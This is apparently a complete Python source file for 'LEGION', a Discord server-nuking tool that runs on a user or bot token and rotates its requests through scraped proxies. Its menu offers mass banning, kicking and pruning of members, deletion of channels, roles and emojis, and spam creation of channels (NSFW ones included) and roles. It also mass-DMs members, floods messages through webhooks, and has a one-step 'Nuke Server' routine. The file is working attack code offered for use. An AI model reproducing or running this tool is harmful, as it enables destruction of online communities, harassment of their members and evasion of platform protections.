import requests, os, sys, threading, time, json, asyncio, discord, datetime, aiohttp, string, random, logging
from random import randint, choice
from time import sleep
from colorama import Fore
from threading import Thread
from itertools import cycle
from colored import fg, attr
from colorama import Fore, Style
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from pypresence import Presence
from string import ascii_lowercase, ascii_uppercase, digits
from os import _exit, system, remove

proxies = []
rotating = cycle(proxies)

out_file = "proxies.txt"
f = open(out_file,'wb')
r1 = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all")
r2 = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt")
r3 = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all")
f.write(r1.content)
f.write(r3.content)
f.write(r2.content)
f.close()


date = datetime.datetime.now()

ok = date.strftime("%H:%M:%S")

def close():

    os._exit(0)

def writechar(text):

   for char in text:

     sys.stdout.write(char)

     sys.stdout.flush()

     time.sleep(0.1)

def clear(insta):
    if sys.platform.startswith("win"):
      os.system('cls')
    elif sys.platform == 'linux' or 'darwin':
      os.system('clear')

class colors:
    main = fg('#00fefc')
    
    reset = attr('reset')

    red = fg('#FF0000')

    reset = attr('reset')

    gray = fg('#ff4b00')

    green = fg('#006400')

    yellow = fg('#FFFF00')

    orange = fg('#ff4b00')



try:
  for line in open('proxies.txt'):
    proxies.append(line.replace('\n',""))
  print(f"{colors.main} > Loaded Proxies ...")
except:
  print(f"Failed to Load Proxies From Proxies.txt")
  
os.system("clear")
print(f"\n\nLoaded proxy successfully...")



with open('config.json', 'r') as f:
    config = json.load(f)
token = config.get("token")





def check_token():
    r = requests.get(f'https://discord.com/api/v{randint(8, 9)}/users/@me', headers={'Authorization': f'{token}'})
    if r.status_code == 200:
        return "user"
    else:
        return "bot"



token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    bot = commands.Bot(command_prefix="$", case_insensitive=True, self_bot=True, help_command=None)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    bot = commands.Bot(command_prefix="$", case_insensitive=True, intents=intents, help_command=None)
else:
    print(f"\033[37m]> \033[37mInvalid Token")
    os._exit(3)

class legion:

    def __init__(self):
        self.color = "\x1b[38;5;51m"

    def ChangeName(self, guild, name):
        try:

            json = {
                'name': name,
            }
            r = requests.patch(f'https://discord.com/api/v{randint(8, 9)}/guilds/{guild}', headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Renamed Guild To{self.color} {name}\033[37m")
            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Rename Guild\033[37m")
        except:
            pass


    def BanAll(self, guild, member, reason):
        while True:
            json = {
                'delete_message_days': 7,
                'reason': reason
            }
            r = requests.put(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{guild}/bans/{member}", json=json, headers=headers, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Banned{self.color} {member.strip()}\033[37m")
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break
            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Ban{self.color} {member.strip()}\033[37m")
                break

    def KickAll(self, guild, member, reason):
        while True:
            json = {
                'reason': reason
            }
            r = requests.put(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{guild}/members/{member}", headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Kicked{self.color} {member.strip()}\033[37m")
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break
            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Kick{self.color} {member.strip()}\033[37m")
                break

    def CreateChannels(self, guild, name):
        while True:
            
            topic = ''.join(choice(ascii_lowercase + digits + ascii_uppercase) for _ in range(1024))
            json = {
                'name': name,
                'topic': topic,
                'type' : 0,
                'permissions': randint(1, 10)
            }
            r = requests.post(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{guild}/channels", headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}ok\033[37m+{self.color}[\033[37m+{self.color}]\033[37m Created Channel{self.color} {name}\033[37m")
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}ok\033[37m+{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break
            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Create Channels{self.color}\033[37m")
                break
    
    def CreateCatChannels(self, guild, name):
        while True:
            json = {
                'name': name
            }
            r = requests.post(f"https://discord.com/api/v{randint(8, 9)}/guilds/{guild}/category", headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Created Voice Channel{self.color} {name}\033[37m")
                break

            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break
            
            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Create Channels{self.color}\033[37m")
                break

    def CreateNsfwChannels(self, guild, name):
        while True:
            
            topic = ''.join(random.choice(string.ascii_lowercase + string.digits + string.ascii_uppercase) for _ in range(1000))
            json = {
                'name': name,
                'nsfw': True,
                'topic': topic,
                'type' : 0,
                'permissions': randint(1, 10)
            }
            r = requests.post(f"https://discord.com/api/v{randint(8, 9)}/guilds/{guild}/channels", headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Created Nsfw Channel{self.color} {name}\033[37m")
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break
            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Create Channels{self.color}\033[37m")
                break
    
    def CreateVoiceChannels(self, guild, name):
        while True:
            json = {
                'name': name,
                'type': 2,
                'user_limit': 1
            }
            r = requests.post(f"https://discord.com/api/v{randint(8, 9)}/guilds/{guild}/channels", headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Created Voice Channel{self.color} {name}\033[37m")
                break

            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break
            
            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Create Channels{self.color}\033[37m")
                break
    
    def CreateRoles(self, guild, name):
        while True:
            json = {
                'name': name,
                'permissions': randint(1, 10),
                'color': randint(1000000, 9999999),
                'hoist': 'true',
                'mentionable': 'true'
            }
            r = requests.post(f"https://discord.com/api/v{randint(8, 9)}/guilds/{guild}/roles", headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Created Role{self.color} {name}\033[37m")
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break
            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Create Roles{self.color}\033[37m")
                break

    def DeleteChannels(self, guild, channel):
        while True:
            json = {
                'reason': 'wizzed'
            }
            r = requests.delete(f"https://discord.com/api/v{randint(8, 9)}/channels/{channel}", headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Deleted Channel{self.color} {channel.strip()}\033[37m")
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break
            else:
                print(f"{self.color}ok\033[37m+{self.color}[\033[37m-{self.color}]\033[37m Couldn't Delete Channel{self.color} {channel.strip()}\033[37m")
                break
    
    def DeleteRoles(self, guild, role):
        while True:
            json = {
                'reason': 'Wizzed'
            }
            r = requests.delete(f"https://discord.com/api/v{randint(8, 9)}/guilds/{guild}/roles/{role}", headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}ok\033[37m+{self.color}[\033[37m+{self.color}]\033[37m Deleted Role{self.color} {role.strip()}\033[37m")
                break

            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break

            else:
                print(f"{self.color}[\033[37m!{self.color}]\033[37m Couldn't Delete Role{self.color} {role.strip()}\033[37m")
                break

    def DeleteEmojis(self, guild, emoji):
        while True:
            json = {
                'reason': 'Wizzed'
            }
            r = requests.delete(f"https://discord/com/api/v{randint(8, 9)}/guilds/{guild}/emojis/{emoji}", headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Deleted Emoji{self.color} {emoji.strip()}\033[37m")
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break
            
            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Delete Emoji{self.color} {emoji.strip()}\033[37m")
                break

    def NicknameMembers(self, guild, member, name):
        while True:
            json = {
                'nick': name
            }
            r = requests.patch(f"https://discord.com/api/v{randint(8, 9)}/guilds/{guild}/members/{member}", headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Nicknamed{self.color} {member.strip()}\033[37m")
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break
            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Nickname{self.color} {member.strip()}\033[37m")
                break
    
    def WebhookSend(self, webhook, message): #credits to anti

        while True:

            json = {

                'content': message,

                'tts': False,

                'username': 'DOXX PAPA'

            }

            r = requests.post(f'{webhook}', json=json, proxies = {"http": 'http://' +next(rotating)})

            if r.status_code == 429:

                  time.sleep(r.json()['retry_after'])

                  self.WebhookSend(webhook, message)

                  break

            else:

                if r.status_code == 204 or 201 or 200:

                    print(f"{colors.red}[+] {colors.orange}Sent message {colors.red} {message}")

                    break

                else:

                    break

    def PruneMembers(self, guild, days, role, reason):
        while True:
            

            json = {
                'days': days,
                'compute_prune_count': True,
                'reason': reason,
                'include_roles': role
            }
            r = requests.post(f"https://discord.com/api/v{randint(8, 9)}/guilds/{guild}/prune", headers=headers, json=json, proxies = {"http": 'http://' +next(rotating)})
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Pruned{self.color} {role}\033[37m")
                break
            
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break

            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Prune{self.color} {role}\033[37m")
                break


    def DMAll(self, guild, member, message):
        
        while True:
            payload = {
                'recipient_id': member,
                'content': message
            }

            r = requests.post(f"https://discord.com/api/v{randint(8, 9)}/users/@me/channels", headers=headers, json=payload, proxies = {"http": 'http://' +next(rotating)})               
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Messaged{self.color} {member.strip()}\033[37m")
                break

            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ratelimit = [f"{self.color}[\033[37m!{self.color}]\033[37m Retrying in{self.color} {retryint}\033[37m seconds{self.color}", f"{self.color}[\033[37m!{self.color}]\033[37m Rate Limited{self.color} for {retryint}\033[37m seconds{self.color}"]
                print(choice(ratelimit))
                sleep(retryint)
                break

            else:
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't DM{self.color} {member.strip()}\033[37m")
                break


    async def NukeExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        channel_name = input(f"{self.color}> \033[37mChannel Names{self.color}: \033[37m")
        channel_amount = input(f"{self.color}> \033[37mChannel Amount{self.color}: \033[37m")
        role_name = input(f"{self.color}> \033[37mRole Names{self.color}: \033[37m")
        role_amount = input(f"{self.color}> \033[37mRole Amount{self.color}: \033[37m")
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mWait chomding the server{self.color}\033[37m')
        

        members = open('Scraped/members.txt')
        channels = open('Scraped/channels.txt')
        roles = open('Scraped/roles.txt')
        emojis = open('Scraped/emojis.txt')

        for member in members:
            Thread(target=self.BanAll, args=(guild, member, "Hacker Runs You")).start()
        for channel in channels:
            Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for emoji in emojis:
            Thread(target=self.DeleteEmojis, args=(guild, emoji,)).start()
        for _ in range(int(channel_amount)):
            Thread(target=self.CreateChannels, args=(guild, channel_name,)).start()
        for _ in range(int(role_amount)):
            Thread(target=self.CreateRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()
        emojis.close()


    async def SpamWebhook(self, guild_id, amount, message):
        
         guild = legion.get_guild(int(guild_id))

         guild_id = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')

         web_urls = []

         amount = input(f'{self.color}> \033[37mAnout{self.color}: \033[37m')

         message = input(f'{self.color}> \033[37mMassege{self.color}: \033[37m')

         for channel in guild.text_channels:

             try:

                webhook = await channel.create_webhook(name='DOXX AND LEGEND ON TOP', reason="lala waise hi uda dia mze kro")

                print(f"{colors.red}[+] {colors.orange}Spammed")

                web_urls.append(webhook.url)

             except Exception as e:

                print(e)

         for url in web_urls:

               for i in range(amount):

                try:

                  threading.Thread(target=self.WebhookSend, args=(url, message,)).start()

                except Exception as e:

                 print(e)    

    async def DmAllExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        message = input(f'{self.color}> \033[37mMessage{self.color}: \033[37m')
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mMessaging Members...{self.color}\033[37m')
        
        members = open('Scraped/members.txt')
        for member in members:
            Thread(target=self.DMAll, args=(guild, member, message,)).start()
        members.close()

    async def PruneMembersExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        days = input(f'{self.color}> \033[37mDays{self.color}: \033[37m')
        reason = input(f'{self.color}> \033[37mReason{self.color}: \033[37m')
        
        roles = open('Scraped/roles.txt')
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mPruning Members...{self.color}\033[37m')
        
        for role in roles:
            Thread(target=self.PruneMembers, args=(guild, days, role, reason,)).start()
        
         

    async def BanExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        reason = input(f'{self.color}> \033[37mReason{self.color}: \033[37m')
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mBanning Members...{self.color}\033[37m')
        
        members = open('Scraped/members.txt')
        for member in members:
            Thread(target=self.BanAll, args=(guild, member, reason,)).start()
        members.close()

    async def KickExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        reason = input(f'{self.color}> \033[37mReason{self.color}: \033[37m')
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mKicking Members...{self.color}\033[37m')
        
        members = open('Scraped/members.txt')
        for member in members:
            Thread(target=self.KickAll, args=(guild, member, reason,)).start()
        members.close()

    async def ChannelDeleteExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mDeleting Channels...{self.color}\033[37m')
        
        channels = open('Scraped/channels.txt')
        for channel in channels:
            Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()
    
    async def EmojiDeleteExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mDeleting Emojis...{self.color}\033[37m')
        
        emojis = open('Scraped/emojis.txt')
        for emoji in emojis:
            Thread(target=self.DeleteEmojis, args=(guild, emoji,)).start()
        emojis.close()

    async def RoleDeleteExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mDeleting Roles...{self.color}\033[37m')
        
        roles = open('Scraped/roles.txt')
        for role in roles:
            Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

    async def ChannelSpamExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        name = input(f"{self.color}> \033[37mChannel Names{self.color}: \033[37m")
        amount = input(f"{self.color}> \033[37mAmount{self.color}: \033[37m")
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mCreating Channels...{self.color}\033[37m')
        
        for _ in range(int(amount)):
            Thread(target=self.CreateChannels, args=(guild, name,)).start()

    async def VoiceChannelSpamExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        name = input(f"{self.color}> \033[37mChannel Names{self.color}: \033[37m")
        amount = input(f"{self.color}> \033[37mAmount{self.color}: \033[37m")
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mCreating Channels...{self.color}\033[37m')
        
        for _ in range(int(amount)):
            Thread(target=self.CreateVoiceChannels, args=(guild, name,)).start()

    async def CatChannelSpamExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        name = input(f"{self.color}> \033[37mChannel Names{self.color}: \033[37m")
        amount = input(f"{self.color}> \033[37mAmount{self.color}: \033[37m")
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mCreating Category...{self.color}\033[37m')
        
        for _ in range(int(amount)):
            Thread(target=self.CreateCatChannels, args=(guild, name,)).start()


    async def NsfwChannelSpamExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        name = input(f"{self.color}> \033[37mChannel Names{self.color}: \033[37m")
        amount = input(f"{self.color}> \033[37mAmount{self.color}: \033[37m")
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mCreating Channels...{self.color}\033[37m')
        
        for _ in range(int(amount)):
            Thread(target=self.CreateNsfwChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        name = input(f"{self.color}> \033[37mRole Names{self.color}: \033[37m")
        amount = input(f"{self.color}> \033[37mAmount{self.color}: \033[37m")
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mCreating Roles...{self.color}\033[37m')
        
        for _ in range(int(amount)):
            Thread(target=self.CreateRoles, args=(guild, name,)).start()

    async def ChangeNameExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        name = input(f'{self.color}> \033[37mName{self.color}: \033[37m')
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mChanging Guild Name...{self.color}\033[37m')
        
        Thread(target=self.ChangeName, args=(guild, name,)).start()

    async def NicknameMembersExecute(self):
        guild = input(f'{self.color}> \033[37mGuild ID{self.color}: \033[37m')
        name = input(f'{self.color}> \033[37mName{self.color}: \033[37m')
        members = open('Scraped/members.txt')
        print(f'\n{self.color}[\033[37m!{self.color}] \033[37mNicknaming Members...{self.color}\033[37m')
        
        for member in members:
            Thread(target=self.NicknameMembers, args=(guild, member, name,)).start()
        members.close()

    def Credits(self):
        print(f'''
      {self.color}             \033[38;5;196m ██▓    ▓█████   ▄████  ██▓ ▒█████   ███▄    █ 
      {self.color}             \033[38;5;196m▓██▒    ▓█   ▀  ██▒ ▀█▒▓██▒▒██▒  ██▒ ██ ▀█   █
      {self.color}             \033[90m▒██░    ▒███   ▒██░▄▄▄░▒██▒▒██░  ██▒▓██  ▀█ ██▒\033[90m
      {self.color}             \033[90m▒██░    ▒▓█  ▄ ░▓█  ██▓░██░▒██   ██░▓██▒  ▐▌██▒\033[90m
      {self.color}             \033[37m░██████▒░▒████▒░▒▓███▀▒░██░░ ████▓▒░▒██░   ▓██░\033[37m
      {self.color}             \033[37m░ ▒░▓  ░░░ ▒░ ░ ░▒   ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒\033[37m
                            {self.color}[\033[37mCode{self.color}]\033[37m by: 
                            {self.color}[\033[37mDiscord{self.color}] \033[37doxx and legend
        \033[37m''')
    async def Menu(self):
        print(f'''
      {self.color}                              \033[38;5;196m ██▓    ▓█████   ▄████  ██▓ ▒█████   ███▄    █ 
      {self.color}                              \033[38;5;196m▓██▒    ▓█   ▀  ██▒ ▀█▒▓██▒▒██▒  ██▒ ██ ▀█   █
      {self.color}                              \033[90m▒██░    ▒███   ▒██░▄▄▄░▒██▒▒██░  ██▒▓██  ▀█ ██▒\033[90m
      {self.color}                              \033[90m▒██░    ▒▓█  ▄ ░▓█  ██▓░██░▒██   ██░▓██▒  ▐▌██▒\033[90m
      {self.color}                              \033[37m░██████▒░▒████▒░▒▓███▀▒░██░░ ████▓▒░▒██░   ▓██░\033[37m
      {self.color}                              \033[37m░ ▒░▓  ░░░ ▒░ ░ ░▒   ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒\033[37m
      {self.color}                              \033[37m░ ░ ▒  ░ ░ ░  ░  ░   ░  ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░\033[37m
      {self.color}\033[37m
      {self.color} \033[37m[{self.color}1\033[37m] \033[37mBan Members       {self.color}\033[37m [{self.color}5\033[37m] \033[37mDelete Channels   {self.color}\033[37m [{self.color}9\033[37m] \033[37mWebSpam      {self.color}\033[37m [{self.color}N\033[37m] \033[37mNickname All       {self.color}\033[37m  {self.color}\033[37m                                                [{self.color}2\033[37m] \033[37mKick Members       {self.color}\033[37m[{self.color}6\033[37m] \033[37mCreate Roles      {self.color}\033[37m [{self.color}0\033[37m] \033[37mStatus           {self.color}\033[37m [{self.color}E\033[37m] \033[37mDelete Emojis      {self.color}\033[37m
      {self.color} \033[37m[{self.color}3\033[37m] \033[37mDM Members        {self.color}\033[37m [{self.color}7\033[37m] \033[37mCreate Channels   {self.color}\033[37m [{self.color}R\033[37m] \033[37mRename Guild     {self.color}\033[37m [{self.color}T\033[37m] \033[37mThemes             {self.color}\033[37m
      {self.color} \033[37m[{self.color}4\033[37m] \033[37mDelete Roles      {self.color}\033[37m [{self.color}8\033[37m] \033[37mNuke Server       {self.color}\033[37m [{self.color}X\033[37m] \033[37mPrune Members    {self.color}\033[37m [{self.color}C\033[37m] \033[37mView Credits       {self.color}\033[37m
      {self.color}\033[37m
             
        \033[37m''')

        choice = input(f'{self.color}> \033[37mChoice{self.color}: \033[37m')

        if choice == '1' or choice == 'ban' or choice == 'banall':
            await self.BanExecute()
            sleep(2)
            await self.Menu()
        elif choice == '2' or choice == 'kick' or choice == 'kickall':
            await self.KickExecute()
            sleep(2)
            await self.Menu()
        elif choice == '3' or choice == 'dm' or choice == 'dmall':
            await self.DmAllExecute()
            sleep(2)
            await self.Menu()
        elif choice == '4' or choice == 'deleteroles':
            await self.RoleDeleteExecute()
            sleep(2)
            await self.Menu()
        elif choice == '5' or choice == 'deletechannels':
            await self.ChannelDeleteExecute()
            sleep(2)
            await self.Menu()
        elif choice == '6' or choice == 'spamroles' or choice == 'createroles':
            await self.RoleSpamExecute()
            sleep(2)
            await self.Menu()
        elif choice == '7' or choice == 'createchannels' or choice == 'spamchannels':
            type = input(f"{self.color}> \033[37mChannel Type{self.color}: \033[37m")
            if type == '1' or type == 'text' or type == 'txt' or type == 'Text' or type == 'TXT' or type == 'Txt' or type == '':
                await self.ChannelSpamExecute()
            elif type == '2' or type == 'voice' or type == 'vc' or type == 'VC' or type == 'Voice':
                await self.VoiceChannelSpamExecute()
            elif type == '3' or type == 'nsfw' or type == 'porn' or type == 'NSFW':
                await self.NsfwChannelSpamExecute()
            elif type == '4' or type == 'cat' or type == 'category':
                await self.CatChannelSpamExecute()
            sleep(5)
            os.system('clear')
            await self.Menu()
        elif choice == '9' or choice == 'spam':
            await self.SpamWebhook()
            sleep(2)
            os.system('clear')
            await self.Menu()
        elif choice == '8' or choice == 'nuke':
            await self.NukeExecute()
            sleep(2)
            os.system('clear')
            await self.Menu()
        elif choice == 'T' or choice == 't' or choice == 'themes':
            await self.ThemeChanger()
        elif choice == 'C' or choice == 'c' or choice == 'credits':
            self.Credits()
            input()
            os.system('clear')
            await self.Menu()
        elif choice == 'X' or choice == 'x' or choice == 'prune':
            await self.PruneMembersExecute()
            sleep(2)
            os.system('clear')
            await self.Menu()
        elif choice == '0':
            await self.SetStatus()
            sleep(2)
            os.system('clear')
            await self.Menu()
        elif choice == 'E' or choice == 'e' or choice == 'deleteemojis':
            await self.EmojiDeleteExecute()
            sleep(2)
            os.system('clear')
            await self.Menu()
        elif choice == 'R' or choice == 'r' or choice == 'rename':
            await self.ChangeNameExecute()
            sleep(2)
            os.system('clear')
            await self.Menu()
        elif choice == 'N' or choice == 'n' or choice == 'nickname':
            await self.NicknameMembersExecute()
            sleep(2)
            os.system('clear')
            await self.Menu()
        elif choice == 'Exit' or choice == 'exit':
            _exit(0)
        else:
            print(f"{self.color}> \033[37mInvalid Input")
            sleep(1)
            os.system('clear')
            await self.Menu()

    async def ThemeChanger(self):
        print(f'''
      {self.color}                        \033[38;5;196m ██▓    ▓█████   ▄████  ██▓ ▒█████   ███▄    █ 
      {self.color}                        \033[38;5;196m▓██▒    ▓█   ▀  ██▒ ▀█▒▓██▒▒██▒  ██▒ ██ ▀█   █
      {self.color}                        \033[90m▒██░    ▒███   ▒██░▄▄▄░▒██▒▒██░  ██▒▓██  ▀█ ██▒\033[90m
      {self.color}                        \033[90m▒██░    ▒▓█  ▄ ░▓█  ██▓░██░▒██   ██░▓██▒  ▐▌██▒\033[90m
      {self.color}                        \033[37m░██████▒░▒████▒░▒▓███▀▒░██░░ ████▓▒░▒██░   ▓██░\033[37m
      {self.color}                        \033[37m░ ▒░▓  ░░░ ▒░ ░ ░▒   ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒\033[37m
      {self.color}\033[37m
